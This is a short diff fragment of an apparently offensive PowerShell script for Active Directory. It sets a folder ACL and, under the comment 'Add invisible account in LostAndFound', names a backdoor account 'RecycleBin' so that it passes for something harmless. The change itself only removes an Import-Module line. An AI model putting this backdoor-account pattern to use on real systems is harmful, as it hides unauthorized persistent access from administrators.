@@ -38,7 +38,6 @@ $fwacl.AddAccessRule($do)
 Set-Acl $path $fwacl
 
 # Add invisible account in LostAndFound
-Import-Module ActiveDirectory
 
 $BackdoorAccountName = "RecycleBin"
 
